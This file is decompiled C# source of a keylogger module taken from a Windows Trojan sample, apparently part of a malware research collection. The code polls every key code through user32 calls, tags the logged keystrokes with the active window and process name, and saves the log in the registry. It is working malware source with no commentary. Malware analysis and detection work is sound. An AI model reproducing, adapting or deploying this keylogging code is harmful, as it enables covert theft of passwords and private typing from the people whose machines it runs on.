// Decompiled with JetBrains decompiler
// Type: w.kl
// Assembly: w, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 87AD811B-6569-4042-88FE-555CF9409655
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-ff65a8d77ade37fae5f4caccfcf172f26534647c1deae8731ff374a48038d9e8.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace w
{
  public class kl
  {
    private string LastAS;
    private int LastAV;
    private Keys lastKey;
    public string Logs;
    public string vn;

    public kl()
    {
      this.lastKey = Keys.None;
      this.Logs = "";
      this.vn = "[kl]";
    }

    private string AV()
    {
      try
      {
        IntPtr foregroundWindow = OK.GetForegroundWindow();
        int b;
        kl.GetWindowThreadProcessId(foregroundWindow, ref b);
        Process processById = Process.GetProcessById(b);
        if (!(foregroundWindow.ToInt32() == this.LastAV & Operators.CompareString(this.LastAS, processById.MainWindowTitle, false) == 0 | processById.MainWindowTitle.Length == 0))
        {
          this.LastAV = foregroundWindow.ToInt32();
          this.LastAS = processById.MainWindowTitle;
          return "\r\n\u0001" + DateAndTime.Now.ToString("yy/MM/dd ") + processById.ProcessName + " " + this.LastAS + "\u0001\r\n";
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return "";
    }

    private string Fix(Keys k)
    {
      bool flag = OK.F.Keyboard.ShiftKeyDown;
      if (OK.F.Keyboard.CapsLock)
        flag = !flag;
      string str1;
      string str2;
      try
      {
        Keys keys = k;
        int num;
        switch (keys)
        {
          case Keys.Back:
          case Keys.Delete:
            num = 1;
            break;
          default:
            num = 0;
            break;
        }
        if (num != 0)
        {
          str1 = "[" + k.ToString() + "]";
          goto label_23;
        }
        else if (keys == Keys.LShiftKey || keys == Keys.RShiftKey || keys == Keys.Shift || keys == Keys.ShiftKey || keys == Keys.Control || keys == Keys.ControlKey || keys == Keys.RControlKey || keys == Keys.LControlKey || keys == Keys.Alt || keys == Keys.F1 || keys == Keys.F2 || keys == Keys.F3 || keys == Keys.F4 || keys == Keys.F5 || keys == Keys.F6 || keys == Keys.F7 || keys == Keys.F8 || keys == Keys.F9 || keys == Keys.F10 || keys == Keys.F11 || keys == Keys.F12 || keys == Keys.End)
        {
          str1 = "";
          goto label_23;
        }
        else if (keys == Keys.Space)
        {
          str1 = " ";
          goto label_23;
        }
        else if (keys == Keys.Return || keys == Keys.Return)
        {
          str1 = !this.Logs.EndsWith("[ENTER]\r\n") ? "[ENTER]\r\n" : "";
          goto label_23;
        }
        else if (keys == Keys.Tab)
        {
          str1 = "[TAP]\r\n";
          goto label_23;
        }
        else if (flag)
        {
          str1 = kl.VKCodeToUnicode(checked ((uint) k)).ToUpper();
          goto label_23;
        }
        else
          str2 = kl.VKCodeToUnicode(checked ((uint) k));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        if (flag)
        {
          string upper = Strings.ChrW((int) k).ToString().ToUpper();
          ProjectData.ClearProjectError();
          str1 = upper;
          ProjectData.ClearProjectError();
          goto label_23;
        }
        else
        {
          str2 = Strings.ChrW((int) k).ToString().ToLower();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      str1 = str2;
label_23:
      return str1;
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short GetAsyncKeyState(int a);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetKeyboardLayout(int a);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] a);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint a, uint b);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
      uint a,
      uint b,
      byte[] c,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder d,
      int e,
      uint f,
      IntPtr g);

    private static string VKCodeToUnicode(uint a)
    {
      try
      {
        StringBuilder d = new StringBuilder();
        byte[] numArray = new byte[(int) byte.MaxValue];
        if (!kl.GetKeyboardState(numArray))
          return "";
        uint b1 = kl.MapVirtualKey(a, 0U);
        int b2 = 0;
        IntPtr keyboardLayout = (IntPtr) kl.GetKeyboardLayout(kl.GetWindowThreadProcessId(OK.GetForegroundWindow(), ref b2));
        kl.ToUnicodeEx(a, b1, numArray, d, 5, 0U, keyboardLayout);
        return d.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return ((Keys) checked ((int) a)).ToString();
    }

    public void WRK()
    {
      this.Logs = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV(this.vn, (object) "")));
      try
      {
        while (true)
        {
          int num1 = 1;
          int a = 0;
          do
          {
            if (kl.GetAsyncKeyState(a) == (short) -32767 & !OK.F.Keyboard.CtrlKeyDown)
            {
              Keys k = (Keys) a;
              string str = this.Fix(k);
              if (str.Length > 0)
              {
                this.Logs += this.AV();
                this.Logs += str;
              }
              this.lastKey = k;
            }
            checked { ++a; }
          }
          while (a <= (int) byte.MaxValue);
          if (num1 == 1000)
          {
            int num2 = checked (Conversions.ToInteger("20") * 1024);
            if (this.Logs.Length > num2)
              this.Logs = this.Logs.Remove(0, checked (this.Logs.Length - num2));
            OK.STV(this.vn, (object) this.Logs, RegistryValueKind.String);
          }
          Thread.Sleep(1);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
